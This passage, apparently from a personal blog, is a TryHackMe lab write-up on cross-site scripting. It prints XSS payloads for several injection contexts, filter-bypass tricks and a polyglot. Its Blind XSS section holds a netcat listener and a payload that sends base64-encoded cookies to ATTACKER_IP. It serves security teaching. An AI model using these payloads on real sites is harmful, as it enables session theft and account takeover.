+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span>&gt;Hello &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);&lt;/<span style="color:#f92672">script</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><h3 id="level-two-input-tag-escape">Level Two: Input Tag Escape</h3>
+<p><strong>Scenario</strong>: User input reflected inside an input tag&rsquo;s value attribute</p>
+<p><strong>Context</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;USER_INPUT_HERE&#34;</span>&gt;
+</span></span></code></pre></div><p><strong>Problem</strong>: Script tags don&rsquo;t execute within input value attributes</p>
+<p><strong>Solution</strong>: Escape the input tag first</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Breakdown</strong>:</p>
+<ul>
+<li><code>&quot;&gt;</code> closes the value attribute and input tag</li>
+<li><code>&lt;script&gt;alert('THM');&lt;/script&gt;</code> executes outside the input context</li>
+</ul>
+<p><strong>Result</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><h3 id="level-three-textarea-tag-escape">Level Three: Textarea Tag Escape</h3>
+<p><strong>Scenario</strong>: User input reflected inside a textarea element</p>
+<p><strong>Context</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span>&gt;USER_INPUT_HERE&lt;/<span style="color:#f92672">textarea</span>&gt;
+</span></span></code></pre></div><p><strong>Solution</strong>: Close the textarea tag before script execution</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</span>
+</span></span></code></pre></div><p><strong>Breakdown</strong>:</p>
+<ul>
+<li><code>&lt;/textarea&gt;</code> closes the current textarea element</li>
+<li>Script tag executes outside the textarea context</li>
+</ul>
+<p><strong>Result</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span>&gt;&lt;/<span style="color:#f92672">textarea</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><h3 id="level-four-javascript-context-escape">Level Four: JavaScript Context Escape</h3>
+<p><strong>Scenario</strong>: User input reflected within existing JavaScript code</p>
+<p><strong>Context</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;USER_INPUT_HERE&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Solution</strong>: Escape the JavaScript string and add new commands</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#e6db74">&#39;;alert(&#39;</span><span style="color:#a6e22e">THM</span><span style="color:#960050;background-color:#1e0010">&#39;</span>);<span style="color:#75715e">//
+</span></span></span></code></pre></div><p><strong>Breakdown</strong>:</p>
+<ul>
+<li><code>'</code> closes the current string</li>
+<li><code>;</code> ends the current JavaScript statement</li>
+<li><code>alert('THM');</code> executes the desired payload</li>
+<li><code>//</code> comments out remaining code to prevent syntax errors</li>
+</ul>
+<p><strong>Result</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;;alert(&#39;THM&#39;);//&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><h3 id="level-five-filter-bypass">Level Five: Filter Bypass</h3>
+<p><strong>Scenario</strong>: Basic keyword filtering removes dangerous words</p>
+<p><strong>Problem</strong>: The word &ldquo;script&rdquo; gets filtered out from payloads</p>
+<p><strong>Filter Behavior</strong>:</p>
+<pre tabindex="0"><code>Original: &lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;
+Filtered: &lt;alert(&#39;THM&#39;);&lt;/&gt;
+</code></pre><p><strong>Solution</strong>: Double the filtered word so removal still leaves valid payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">sscriptcript</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/sscriptcript&gt;</span>
+</span></span></code></pre></div><p><strong>Filter Process</strong>:</p>
+<pre tabindex="0"><code>Original: &lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;
+Removed:  &lt;s______cript&gt;alert(&#39;THM&#39;);&lt;/s______cript&gt;
+Result:   &lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;
+</code></pre><h3 id="level-six-character-filtering-and-event-handlers">Level Six: Character Filtering and Event Handlers</h3>
+<p><strong>Scenario</strong>: Angular brackets (<code>&lt;</code> and <code>&gt;</code>) are filtered, preventing tag creation</p>
+<p><strong>Context</strong>: Input reflected in an image tag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;USER_INPUT_HERE&#34;</span>&gt;
+</span></span></code></pre></div><p><strong>Problem</strong>: Cannot create new tags due to character filtering</p>
+<p><strong>Solution</strong>: Use existing tag attributes for code execution</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/images/cat.jpg&#34; onload=&#34;alert(&#39;THM&#39;);</span>
+</span></span></code></pre></div><p><strong>How it works</strong>:</p>
+<ul>
+<li><code>&quot;</code> closes the src attribute</li>
+<li><code>onload=&quot;alert('THM');&quot;</code> adds an event handler</li>
+<li>Event executes when the image loads</li>
+</ul>
+<p><strong>Result</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/images/cat.jpg&#34;</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(&#39;THM&#39;);&#34;</span>&gt;
+</span></span></code></pre></div><h3 id="xss-polyglots">XSS Polyglots</h3>
+<p><strong>What is a Polyglot?</strong>
+An XSS polyglot is a string of text that can escape attributes, tags, and bypass filters all in one payload. It&rsquo;s designed to work across multiple contexts without modification.</p>
+<p><strong>Universal Polyglot Example</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">jaVasCript</span><span style="color:#f92672">:</span><span style="color:#75715e">/*-/*`/*\`/*&#39;/*&#34;/**/</span>(<span style="color:#75715e">/* */</span><span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>) )<span style="color:#75715e">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#39;THM&#39;)//&gt;\x3e
+</span></span></span></code></pre></div><p><strong>Polyglot Benefits</strong>:</p>
+<ul>
+<li>Works across multiple injection contexts</li>
+<li>Bypasses various filtering mechanisms</li>
+<li>Saves time during testing by providing universal payload</li>
+<li>Demonstrates advanced understanding of XSS techniques</li>
+</ul>
+<h3 id="task-challenge-4">Task Challenge</h3>
+<p><strong>Question</strong>: What is the flag you received from level six?</p>
+<p><strong>Answer</strong>: [Flag obtained after completing all six levels]</p>
+<p><strong>Process</strong>: Complete each level systematically, adapting payloads to the specific injection context and filtering mechanisms.</p>
+<hr>
+<h2 id="task-8-practical-example-blind-xss---real-world-application">Task 8: Practical Example (Blind XSS) - Real-World Application</h2>
+<h3 id="setting-up-the-lab-environment">Setting Up the Lab Environment</h3>
+<p>This task demonstrates Blind XSS in a realistic support ticket system, simulating how attackers might target administrative interfaces.</p>
+<h3 id="initial-reconnaissance">Initial Reconnaissance</h3>
+<p><strong>Target</strong>: Acme IT Support website support ticket system</p>
+<p><strong>Process</strong>:</p>
+<ol>
+<li>Create user account through signup process</li>
+<li>Navigate to Support Tickets section</li>
+<li>Create test ticket to understand functionality</li>
+<li>Analyze how input is processed and displayed</li>
+</ol>
+<h3 id="basic-vulnerability-testing">Basic Vulnerability Testing</h3>
+<p><strong>Initial Test</strong>: Create ticket with simple content</p>
+<pre tabindex="0"><code>Subject: Test
+Content: test
+</code></pre><p><strong>Source Code Analysis</strong>: Input reflected in textarea element</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span>&gt;test&lt;/<span style="color:#f92672">textarea</span>&gt;
+</span></span></code></pre></div><h3 id="confirming-textarea-escape">Confirming Textarea Escape</h3>
+<p><strong>Test Payload</strong>: Verify ability to escape textarea context</p>
+<pre tabindex="0"><code>&lt;/textarea&gt;test
+</code></pre><p><strong>Result</strong>: Successfully breaks out of textarea element</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span>&gt;&lt;/<span style="color:#f92672">textarea</span>&gt;test
+</span></span></code></pre></div><h3 id="confirming-javascript-execution">Confirming JavaScript Execution</h3>
+<p><strong>XSS Payload</strong>: Test basic script execution</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</span>
+</span></span></code></pre></div><p><strong>Result</strong>: Alert box confirms JavaScript execution capability</p>
+<h3 id="advanced-payload-development">Advanced Payload Development</h3>
+<h3 id="setting-up-data-exfiltration">Setting Up Data Exfiltration</h3>
+<p><strong>Netcat Listener</strong>: Prepare to receive stolen data</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">9001</span>
+</span></span></code></pre></div><p><strong>Command Breakdown</strong>:</p>
+<ul>
+<li><code>-n</code>: Avoid DNS resolution</li>
+<li><code>-l</code>: Listen mode</li>
+<li><code>-v</code>: Verbose output</li>
+<li><code>-p 9001</code>: Listen on port 9001</li>
+</ul>
+<h3 id="cookie-stealing-payload">Cookie Stealing Payload</h3>
+<p><strong>Complete Payload</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">/textarea&gt;&lt;script&gt;fetch(&#39;http:/</span><span style="color:#f92672">/</span><span style="color:#a6e22e">ATTACKER_IP</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9001</span><span style="color:#f92672">?</span><span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>));<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Payload Analysis</strong>:</p>
+<ul>
+<li><code>&lt;/textarea&gt;</code>: Escapes the textarea context</li>
+<li><code>&lt;script&gt;</code>: Opens JavaScript execution context</li>
+<li><code>fetch()</code>: Makes HTTP request to attacker server</li>
+<li><code>http://ATTACKER_IP:9001</code>: Attacker-controlled endpoint</li>
+<li><code>?cookie=</code>: Query parameter containing stolen data</li>
+<li><code>btoa(document.cookie)</code>: Base64 encoded victim cookies</li>
+<li><code>document.cookie</code>: Accesses victim&rsquo;s session cookies</li>
+</ul>
+<h3 id="exploitation-process">Exploitation Process</h3>
+<ol>
+<li><strong>Submit Payload</strong>: Create support ticket with malicious content</li>
+<li><strong>Wait for Staff</strong>: Support staff will eventually view the ticket</li>
+<li><strong>Receive Data</strong>: Netcat listener captures incoming requests</li>
+<li><strong>Decode Information</strong>: Base64 decode captured cookie data</li>
+</ol>
+<h3 id="impact-assessment">Impact Assessment</h3>
+<p><strong>Captured Information</strong>:</p>
+<ul>
+<li>Staff session cookies</li>
+<li>Administrative access tokens</li>
+<li>Potentially sensitive system information</li>
+</ul>
+<p><strong>Potential Follow-up Attacks</strong>:</p>
+<ul>
+<li>Session hijacking using stolen cookies</li>
+<li>Administrative account takeover</li>
+<li>Access to customer data and internal systems</li>
+</ul>
+<h3 id="task-challenge-5">Task Challenge</h3>
+<p><strong>Question</strong>: What is the value of the staff-session cookie?</p>
+<p><strong>Process</strong>:</p>
+<ol>
+<li>Execute the complete payload in a support ticket</li>
+<li>Monitor Netcat listener for incoming requests</li>
+<li>Extract base64 encoded cookie data from request</li>
+<li>Decode using base64 decoder (e.g., <a href="https://www.base64decode.org/">https://www.base64decode.org/</a>)</li>
+<li>Locate staff-session cookie value</li>
+</ol>
+<p><strong>Answer</strong>: [Decoded staff-session cookie value]</p>
+<hr>
+<h2 id="key-takeaways-and-lessons-learned">Key Takeaways and Lessons Learned</h2>
+<h3 id="technical-skills-developed">Technical Skills Developed</h3>
+<p><strong>XSS Vulnerability Identification:</strong></p>
+<ul>
+<li>Learned to identify different types of XSS vulnerabilities</li>
+<li>Mastered systematic testing approaches for various injection contexts</li>
+<li>Developed skills in analyzing how user input is processed and reflected</li>
+</ul>
+<p><strong>Payload Creation and Modification:</strong></p>
+<ul>
+<li>Understanding how injection context affects payload requirements</li>
+<li>Learning to escape different HTML elements and attributes</li>
+<li>Developing filter bypass techniques for common security measures</li>
+</ul>
+<p><strong>Advanced Exploitation Techniques:</strong></p>
+<ul>
+<li>Setting up data exfiltration mechanisms</li>
+<li>Using callback methods for Blind XSS detection</li>
+<li>Understanding the impact and business risk of XSS vulnerabilities</li>
+</ul>
+<h3 id="security-mindset-development">Security Mindset Development</h3>
+<p><strong>Client-Side Security is Complex:</strong>
+XSS demonstrates that client-side security requires careful attention to how user input is processed, stored, and displayed across different contexts.</p>
+<p><strong>Context Matters:</strong>
+The same payload may not work across different injection points, requiring careful analysis and modification based on the specific HTML context.</p>
+<p><strong>Defense in Depth:</strong>
+Effective XSS prevention requires multiple layers of security, including input validation, output encoding, and Content Security Policy implementation.</p>
+<h3 id="real-world-applications">Real-World Applications</h3>
+<p><strong>For Web Developers:</strong></p>
+<ul>
+<li>Implement proper input validation and output encoding</li>
+<li>Use Content Security Policy (CSP) headers</li>
+<li>Employ secure coding practices and frameworks</li>
+<li>Regular security testing and code review processes</li>
+</ul>
+<p><strong>For Security Professionals:</strong></p>
+<ul>
+<li>Develop systematic XSS testing methodologies</li>
+<li>Understand business impact and risk assessment</li>
+<li>Master payload modification for different contexts</li>
+<li>Learn to communicate XSS risks to development teams</li>
+</ul>
+<p><strong>For Bug Bounty Hunters:</strong></p>
+<ul>
+<li>Practice payload creation and filter bypass techniques</li>
+<li>Understand how to demonstrate real-world impact</li>
+<li>Learn to find XSS in complex modern web applications</li>
+<li>Develop skills in Blind XSS detection and exploitation</li>
+</ul>
+<hr>
+<h2 id="tools-and-resources-for-continued-learning">Tools and Resources for Continued Learning</h2>
+<h3 id="essential-xss-testing-tools">Essential XSS Testing Tools</h3>
+<p><strong>Browser-Based Tools:</strong></p>
+<ul>
+<li><strong>Developer Tools</strong>: Source code analysis and DOM inspection</li>
+<li><strong>Browser Console</strong>: Testing JavaScript payloads interactively</li>
+<li><strong>Network Tab</strong>: Monitoring requests and responses</li>
+</ul>
+<p><strong>Professional Testing Tools:</strong></p>
+<ul>
+<li><strong>Burp Suite</strong>: Web application security testing platform</li>
+<li><strong>XSS Hunter Express</strong>: Specialized Blind XSS testing</li>
+<li><strong>OWASP ZAP</strong>: Free web application security scanner</li>
+<li><strong>XSSer</strong>: Automated XSS detection tool</li>
+</ul>
+<h3 id="recommended-learning-resources">Recommended Learning Resources</h3>
+<p><strong>Practice Platforms:</strong></p>
+<ul>
+<li><strong>DVWA (Damn Vulnerable Web Application)</strong>: XSS practice labs</li>
+<li><strong>WebGoat</strong>: OWASP educational web application</li>
+<li><strong>bWAPP</strong>: Extensive web vulnerability practice</li>
+<li><strong>XSS Game by Google</strong>: Interactive XSS challenges</li>
+</ul>
+<p><strong>Reference Materials:</strong></p>
+<ul>
+<li><strong>OWASP XSS Prevention Cheat Sheet</strong>: Comprehensive prevention guide</li>
+<li><strong>PortSwigger Web Security Academy</strong>: Free XSS training modules</li>
+<li><strong>MDN JavaScript Documentation</strong>: Understanding JavaScript for payload creation</li>
+</ul>
+<hr>
+<h2 id="common-challenges-and-how-to-overcome-them">Common Challenges and How to Overcome Them</h2>
+<h3 id="challenge-1-context-recognition">Challenge 1: Context Recognition</h3>
+<p><strong>Problem</strong>: Difficulty determining the correct payload for different injection contexts
+<strong>Solution:</strong></p>
+<ul>
+<li>Always view page source to understand injection context</li>
+<li>Practice with different HTML elements and attributes</li>
+<li>Start with simple payloads and modify based on context</li>
+<li>Use browser developer tools to analyze DOM structure</li>
+</ul>
+<h3 id="challenge-2-filter-bypass">Challenge 2: Filter Bypass</h3>
+<p><strong>Problem</strong>: Security filters blocking common XSS payloads
+<strong>Solution:</strong></p>
+<ul>
+<li>Learn about different encoding techniques (URL, HTML, JavaScript)</li>
+<li>Practice with polyglot payloads that work across contexts</li>
+<li>Understand common filter patterns and bypass methods</li>
+<li>Test with different case variations and character substitutions</li>
+</ul>
+<h3 id="challenge-3-blind-xss-detection">Challenge 3: Blind XSS Detection</h3>
+<p><strong>Problem</strong>: Difficulty confirming payload execution in Blind XSS scenarios
+<strong>Solution:</strong></p>
+<ul>
+<li>Set up reliable callback mechanisms (HTTP servers, webhooks)</li>
+<li>Use tools like XSS Hunter Express for automated detection</li>
+<li>Be patient - staff may not view submissions immediately</li>
+<li>Test multiple input points that might reach administrative users</li>
+</ul>
+<h3 id="challenge-4-real-world-application">Challenge 4: Real-World Application</h3>
+<p><strong>Problem</strong>: Lab scenarios don&rsquo;t always translate to real applications
+<strong>Solution:</strong></p>
+<ul>
+<li>Practice on diverse web applications and frameworks</li>
+<li>Understand how modern security measures affect XSS testing</li>
+<li>Learn about Content Security Policy and other modern protections</li>
+<li>Study real-world XSS reports and bug bounty writeups</li>
+</ul>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>Completing TryHackMe&rsquo;s &ldquo;Intro to Cross-Site Scripting&rdquo; room provided comprehensive understanding of one of the most critical web application security vulnerabilities. This hands-on experience successfully bridged theoretical knowledge with practical exploitation techniques.</p>
+<h3 id="most-valuable-insights">Most Valuable Insights:</h3>
+<p><strong>Context is Everything:</strong> XSS exploitation requires deep understanding of how user input is processed and reflected in different HTML contexts.</p>
+<p><strong>Filter Evasion is an Art:</strong> Modern web applications implement various security measures, making creative bypass techniques essential for successful testing.</p>
+<p><strong>Impact Assessment is Crucial:</strong> Understanding the business impact of XSS vulnerabilities helps prioritize remediation efforts and communicate risks effectively.</p>
+<p><strong>Blind XSS is Underestimated:</strong> The potential for gaining administrative access through Blind XSS makes it one of the most dangerous XSS variants.</p>
+<h3 id="impact-on-my-cybersecurity-journey">Impact on My Cybersecurity Journey:</h3>
+<p>This room provided essential skills for web application security testing and demonstrated how client-side vulnerabilities can have severe security implications. The practical approach made complex concepts accessible while providing real-world applicable knowledge.</p>
+<h3 id="for-fellow-learners">For Fellow Learners:</h3>
+<p>Whether you&rsquo;re beginning your journey in web application security, preparing for bug bounty hunting, or seeking to understand client-side vulnerabilities better, this room provides invaluable hands-on experience with industry-standard exploitation techniques.</p>
+<p>The journey into web application security requires understanding both offensive and defensive perspectives, and XSS provides an excellent foundation for both. Master these concepts, and you&rsquo;ll have crucial skills for any cybersecurity role involving web applications.</p>
+<hr>
+<h2 id="connect-with-me">Connect with Me</h2>
+<p>Found this writeup helpful? I&rsquo;d love to connect and discuss web application security, XSS techniques, and cybersecurity careers!</p>
+<p>Find me on:</p>
+<ul>
+<li><strong>TryHackMe</strong>: <a href="https://tryhackme.com/p/driscollkile">https://tryhackme.com/p/driscollkile</a></li>
+<li><strong>LinkedIn</strong>: <a href="https://www.linkedin.com/in/kile-driscoll/">Kile-driscoll</a></li>
+<li><strong>GitHub</strong>: <a href="https://github.com/Kile578">Kile578</a></li>
+<li><strong>Blog</strong>: <a href="https://kile578.github.io/">https://kile578.github.io/</a></li>
+</ul>
+<p>Questions or stuck on any part? Feel free to reach out! The cybersecurity community thrives on collaboration and knowledge sharing. We&rsquo;re all learning together on this journey.</p>
+<hr>
+<h2 id="questions-for-further-exploration">Questions for Further Exploration</h2>
+<p><strong>Advanced XSS and Web Security Concepts:</strong></p>
+<p>With the fundamentals of XSS covered, several advanced questions emerge for deeper exploration:</p>
+<p><strong>Consider these questions:</strong></p>
+<ol>
+<li>
+<p><strong>Modern Defense Mechanisms</strong>: How do Content Security Policy (CSP) headers change the XSS landscape, and what techniques can be used to bypass strict CSP implementations?</p>
+</li>
+<li>
+<p><strong>Framework-Specific XSS</strong>: How do modern JavaScript frameworks like React, Angular, and Vue.js handle XSS prevention, and where might vulnerabilities still exist?</p>
+</li>
+<li>
+<p><strong>XSS in APIs and Single Page Applications</strong>: As web applications move toward API-driven architectures, how does XSS manifest in REST APIs and SPA environments?</p>
+</li>
+<li>
+<p><strong>Automated XSS Detection</strong>: What are the limitations of automated XSS scanners, and how can manual testing complement automated tools for comprehensive coverage?</p>
+</li>
+<li>
+<p><strong>XSS Payload Evolution</strong>: How have XSS payloads evolved to bypass modern browser security features like XSS Auditor and built-in XSS filters?</p>
+</li>
+</ol>
+<p><strong>Research Challenge:</strong></p>
+<p>Investigate the concept of &ldquo;DOM Clobbering&rdquo; and how it relates to XSS attacks. How can attackers use DOM Clobbering to bypass XSS filters and achieve code execution in modern web applications?</p>
+<p><strong>Discussion Points:</strong></p>
+<ul>
+<li>What role does secure coding education play in preventing XSS vulnerabilities at the development level?</li>
+<li>How do bug bounty programs contribute to the discovery and remediation of XSS vulnerabilities in real-world applications?</li>
+<li>What are the legal and ethical considerations when testing for XSS vulnerabilities in production applications?</li>
+<li>How might emerging web technologies and standards affect the future of XSS vulnerabilities and prevention?</li>
+</ul>
+<p>These questions bridge the gap between learning basic XSS concepts and understanding the advanced methodologies required for modern web application security testing and defense.</p>
+<hr>
+<h2 id="final-words">Final Words</h2>
+<p>Remember: always test ethically and with proper authorization. XSS testing should only be performed on applications you own or have explicit permission to test. Use your knowledge responsibly to improve security, not to cause harm.</p>
+<p>The skills learned in this room form the foundation for advanced web application security testing. Continue practicing in authorized environments, stay updated with evolving web technologies, and always maintain an ethical approach to security research.</p>
+<p>Happy testing, and welcome to the world of web application security!</p>
+<hr>
+<p><strong>Tags:</strong> #TryHackMe #XSS #WebSecurity #CrossSiteScripting #WebApplicationSecurity #CyberSecurity #PenetrationTesting #BugBounty #SecurityTesting #EthicalHacking #WebVulnerabilities #JavaScript #SecurityResearch #InfoSec</p>
+<hr>
+<p>*This comprehensive guide represents my personal learning journey through TryHackMe&rsquo;s &quot;</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white white-70 dn dib-ns pv2 ph3 no-underline" href="http://localhost:1313/" >
+    &copy;  My Cybersecurity Blog 2025 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
